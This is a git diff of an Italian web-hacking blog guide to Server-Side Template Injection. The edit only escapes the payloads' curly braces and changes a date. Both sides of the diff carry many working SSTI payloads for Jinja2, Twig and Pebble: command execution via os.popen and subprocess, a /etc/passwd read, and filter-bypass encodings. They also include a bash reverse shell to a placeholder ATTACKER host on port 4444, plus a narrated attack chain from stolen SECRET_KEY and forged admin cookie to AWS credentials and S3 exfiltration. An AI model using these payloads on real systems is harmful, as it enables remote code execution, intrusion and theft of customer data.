@@ -4,7 +4,7 @@ slug: ssti
 description: 'Guida completa alla SSTI: come identificare Server-Side Template Injection, riconoscere il template engine e ottenere RCE con Jinja2, Twig o Freemarker.'
 image: /ssti.webp
 draft: true
-date: 2026-03-19T00:00:00.000Z
+date: 2026-03-15T00:00:00.000Z
 categories:
   - web-hacking
 subcategories:
@@ -17,7 +17,7 @@ featured: true
 
 I template engine sono ovunque nelle applicazioni moderne: Jinja2 per Flask/Django, Twig per Symfony/Laravel, Freemarker per Spring Boot, ERB per Ruby on Rails, Nunjucks per Express. Servono a generare HTML dinamico separando la logica dalla presentazione — e funzionano benissimo. Il problema sorge quando lo sviluppatore inserisce l'input dell'utente **dentro il template** anziché passarlo **come variabile al template**. Sembra una distinzione minima. La differenza è tra un sito web funzionante e un server completamente compromesso.
 
-La **Server-Side Template Injection** (SSTI) si verifica esattamente in quel punto: l'input dell'utente viene trattato come codice del template, non come dato. Se scrivo `{{7*7}}` in un campo di input e la pagina mi mostra `49`, il template engine ha interpretato la mia espressione matematica. Se il template engine interpreta una moltiplicazione, può anche interpretare l'accesso a oggetti Python, chiamate a `Runtime.exec()` in Java, o la lettura di file di sistema. Da `{{7*7}}` a `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` il passo è breve — e il risultato è **RCE**.
+La **Server-Side Template Injection** (SSTI) si verifica esattamente in quel punto: l'input dell'utente viene trattato come codice del template, non come dato. Se scrivo `{{ "{{" }}7*7{{ "}}" }}` in un campo di input e la pagina mi mostra `49`, il template engine ha interpretato la mia espressione matematica. Se il template engine interpreta una moltiplicazione, può anche interpretare l'accesso a oggetti Python, chiamate a `Runtime.exec()` in Java, o la lettura di file di sistema. Da `{{ "{{" }}7*7{{ "}}" }}` a `{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ "}}" }}` il passo è breve — e il risultato è **RCE**.
 
 La trovo nel **12% dei pentest su applicazioni Python/Node/Java**. Il dato che sorprende è che questa percentuale è in **crescita**: i microservizi con template per email, notifiche push, PDF e report personalizzati creano continuamente nuove superfici di attacco. Nel 2020 la trovavo nel 5% — è più che raddoppiata.
 
@@ -51,13 +51,13 @@ tplmap -u "https://target.com/page?name=test"
 Il primo passo è capire **se** il template engine valuta l'input e **quale** template engine è in uso. Il modo più efficiente è usare il "polyglot" — una stringa che contiene le sintassi di più engine:
 
 ```
-${{<%[%'"}}%\.
+${{ "{{" }}<%[%'"{{ "}}" }}%\.
 ```
 
 Se la pagina va in errore → qualche template engine ha provato a interpretare la stringa. Ora restringi:
 
 ```
-{{7*7}}    → 49?  → Jinja2, Twig, Nunjucks o simili
+{{ "{{" }}7*7{{ "}}" }}    → 49?  → Jinja2, Twig, Nunjucks o simili
 ${7*7}     → 49?  → Freemarker, Velocity, Thymeleaf
 <%= 7*7 %> → 49?  → ERB (Ruby) o EJS (Node.js)
 #{7*7}     → 49?  → Pebble (Java) o Slim (Ruby)
@@ -66,15 +66,15 @@ ${7*7}     → 49?  → Freemarker, Velocity, Thymeleaf
 ### Mappa di Identificazione Dettagliata
 
 ```
-Input: {{7*7}}
+Input: {{ "{{" }}7*7{{ "}}" }}
 ├── Output: 49
-│   ├── Input: {{7*'7'}}
+│   ├── Input: {{ "{{" }}7*'7'{{ "}}" }}
 │   │   ├── Output: 7777777 → ✅ Jinja2 (Python)
 │   │   ├── Output: 49      → ✅ Twig (PHP)
 │   │   └── Output: 7777777 → ✅ Nunjucks (Node.js)
-│   └── Input: {{_self}}
+│   └── Input: {{ "{{" }}_self{{ "}}" }}
 │       └── Output contiene "Twig" → ✅ Twig
-├── Output: {{7*7}} (letterale)
+├── Output: {{ "{{" }}7*7{{ "}}" }} (letterale)
 │   └── Input: ${7*7}
 │       ├── Output: 49 → Freemarker o Velocity
 │       │   └── Input: ${7?upper_case}
@@ -94,52 +94,52 @@ Jinja2 è il template engine più comune nelle applicazioni Python. L'exploitati
 
 ```python
 # Step 1 — Conferma
-{{7*7}}       → 49
-{{7*'7'}}     → 7777777 (string multiplication → Jinja2!)
+{{ "{{" }}7*7{{ "}}" }}       → 49
+{{ "{{" }}7*'7'{{ "}}" }}     → 7777777 (string multiplication → Jinja2!)
 
 # Step 2 — Leggi configurazione Flask
-{{config}}
-{{config.SECRET_KEY}}
+{{ "{{" }}config{{ "}}" }}
+{{ "{{" }}config.SECRET_KEY{{ "}}" }}
 
 # Step 3 — Traversal MRO per trovare classi utili
-{{''.__class__.__mro__}}
+{{ "{{" }}''.__class__.__mro__{{ "}}" }}
 # → (<class 'str'>, <class 'object'>)
-{{''.__class__.__mro__[1].__subclasses__()}}
+{{ "{{" }}''.__class__.__mro__[1].__subclasses__(){{ "}}" }}
 # → lista di TUTTE le classi Python caricate
 
 # Step 4 — Trova la classe Popen (per RCE)
 # Cerca subprocess.Popen nella lista (spesso indice ~250-400)
-{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}
+{{ "{{" }}''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate(){{ "}}" }}
 
 # Step 5 — Shortcut via config (Flask)
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ "}}" }}
 
 # Step 6 — Shortcut via request (Flask)
-{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}
+{{ "{{" }}request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read(){{ "}}" }}
 ```
 
 **Reverse shell via Jinja2:**
 
 ```python
-{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read()}}
+{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read(){{ "}}" }}
 ```
 
 ### Twig (PHP — Symfony, Laravel)
 
 ```php
 # Conferma
-{{7*7}}     → 49
-{{7*'7'}}   → 49 (non moltiplica stringhe → Twig, non Jinja2)
-{{_self}}   → mostra info su Twig
+{{ "{{" }}7*7{{ "}}" }}     → 49
+{{ "{{" }}7*'7'{{ "}}" }}   → 49 (non moltiplica stringhe → Twig, non Jinja2)
+{{ "{{" }}_self{{ "}}" }}   → mostra info su Twig
 
 # RCE (Twig < 3.x)
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{ "{{" }}_self.env.registerUndefinedFilterCallback("exec"){{ "}}" }}{{ "{{" }}_self.env.getFilter("id"){{ "}}" }}
 
 # RCE (Twig 3.x) — via System
-{{['id']|filter('system')}}
+{{ "{{" }}['id']|filter('system'){{ "}}" }}
 
 # File read
-{{'/etc/passwd'|file_excerpt(0,100)}}
+{{ "{{" }}'/etc/passwd'|file_excerpt(0,100){{ "}}" }}
 ```
 
 ### Freemarker (Java — Spring Boot)
@@ -190,12 +190,12 @@ $invoke.exec("id")
 
 ```java
 # Conferma
-{{ 7*7 }}   → 49
+{{ "{{" }} 7*7 {{ "}}" }}   → 49
 
 # RCE (Pebble < 3.0.9)
 {% set cmd = 'id' %}
 {% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}
-{{ bytes }}
+{{ "{{" }} bytes {{ "}}" }}
 ```
 
 ## Bypass Sandbox e Filtri
@@ -206,13 +206,13 @@ Se `_` è filtrato (il filtro più comune perché blocca `__class__`, `__mro__`,
 
 ```python
 # Via request
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
+{{ "{{" }}request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f'){{ "}}" }}
 
 # Via hex encoding
-{{''|attr('\x5f\x5fclass\x5f\x5f')}}
+{{ "{{" }}''|attr('\x5f\x5fclass\x5f\x5f'){{ "}}" }}
 
 # Via format string
-{{'%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95)}}
+{{ "{{" }}'%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95){{ "}}" }}
 # → "__class__"
 ```
 
@@ -220,17 +220,17 @@ Se `_` è filtrato (il filtro più comune perché blocca `__class__`, `__mro__`,
 
 ```python
 # Via attr filter
-{{''|attr('__class__')|attr('__mro__')}}
+{{ "{{" }}''|attr('__class__')|attr('__mro__'){{ "}}" }}
 
 # Via bracket notation
-{{''['__class__']['__mro__']}}
+{{ "{{" }}''['__class__']['__mro__']{{ "}}" }}
 ```
 
 ### Jinja2 — Bypass senza parentesi
 
 ```python
 # Via Jinja2 filters
-{{''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(287).__init__.__globals__.__getitem__('os').popen('id').read()}}
+{{ "{{" }}''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(287).__init__.__globals__.__getitem__('os').popen('id').read(){{ "}}" }}
 ```
 
 ## tplmap — Automazione SSTI
@@ -262,7 +262,7 @@ SSTI su Flask app → RCE nel container/pod
 → o: service account Kubernetes → kubectl → cluster admin
 ```
 
-**Tempo reale:** 30-60 minuti dalla prima `{{7*7}}` al cloud compromise.
+**Tempo reale:** 30-60 minuti dalla prima `{{ "{{" }}7*7{{ "}}" }}` al cloud compromise.
 
 La SSTI è particolarmente devastante nel cloud perché le applicazioni Flask/Django su Kubernetes hanno spesso accesso a credenziali cloud via service account o variabili d'ambiente.
 
@@ -273,11 +273,11 @@ Le SSTI nel 2026 si trovano soprattutto nei **microservizi che generano contenut
 ```json
 // Template email personalizzata
 POST /api/v2/notifications/send
-{"to": "user@example.com", "template": "welcome", "variables": {"name": "{{config.SECRET_KEY}}"}}
+{"to": "user@example.com", "template": "welcome", "variables": {"name": "{{ "{{" }}config.SECRET_KEY{{ "}}" }}"}}
 
 // Generazione PDF con template
 POST /api/v2/reports/generate
-{"template_body": "Gentile {{7*7}}, ecco il suo report", "data": {...}}
+{"template_body": "Gentile {{ "{{" }}7*7{{ "}}" }}, ecco il suo report", "data": {...}}
 
 // Messaggi in-app
 POST /api/v2/messages/preview
@@ -286,7 +286,7 @@ POST /api/v2/messages/preview
 
 ## Micro Playbook Reale
 
-**Minuto 0-3 →** Testa il polyglot su ogni campo: `${{<%[%'"}}%\.`
+**Minuto 0-3 →** Testa il polyglot su ogni campo: `${{ "{{" }}<%[%'"{{ "}}" }}%\.`
 **Minuto 3-5 →** Se errore/49 → identifica il template engine con la mappa
 **Minuto 5-10 →** Exploitation con chain specifica dell'engine
 **Minuto 10-15 →** Reverse shell o lettura credenziali
@@ -300,11 +300,11 @@ POST /api/v2/messages/preview
 
 Il sito aveva una funzione "personalizza il tuo messaggio regalo" dove l'utente scriveva un testo che veniva renderizzato con Jinja2 per mostrare un'anteprima. Lo sviluppatore usava `render_template_string(f"<p>{user_message}</p>")` — SSTI classica.
 
-`{{7*7}}` → 49 nel preview. `{{config}}` → SECRET\_KEY, DATABASE\_URI, MAIL\_PASSWORD. `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` → `uid=1000(flask)`.
+`{{ "{{" }}7*7{{ "}}" }}` → 49 nel preview. `{{ "{{" }}config{{ "}}" }}` → SECRET\_KEY, DATABASE\_URI, MAIL\_PASSWORD. `{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ "}}" }}` → `uid=1000(flask)`.
 
 Con la SECRET\_KEY ho forgiato un session cookie admin (Flask usa cookie firmati con la SECRET\_KEY). Login come admin → 30.000 clienti con dati personali e storico ordini. Dalla shell Flask, `cat /proc/self/environ` → credenziali AWS → S3 bucket con backup completo del database.
 
-**Tempo dalla prima `{{7*7}}` alla shell:** 12 minuti. **Al cloud access:** 25 minuti.
+**Tempo dalla prima `{{ "{{" }}7*7{{ "}}" }}` alla shell:** 12 minuti. **Al cloud access:** 25 minuti.
 
 ## Errori Comuni Reali
 
@@ -334,7 +334,7 @@ La funzione di anteprima usa lo stesso engine della produzione — se accetta SS
 ## Mini Chain Offensiva Reale
 
 ```
-SSTI {{7*7}} → {{config}} → SECRET_KEY → Forged Admin Cookie → Admin Panel → {{os.popen('id')}} → Shell → AWS Creds → S3 Exfiltration
+SSTI {{ "{{" }}7*7{{ "}}" }} → {{ "{{" }}config{{ "}}" }} → SECRET_KEY → Forged Admin Cookie → Admin Panel → {{ "{{" }}os.popen('id'){{ "}}" }} → Shell → AWS Creds → S3 Exfiltration
 ```
 
 ## Detection & Hardening
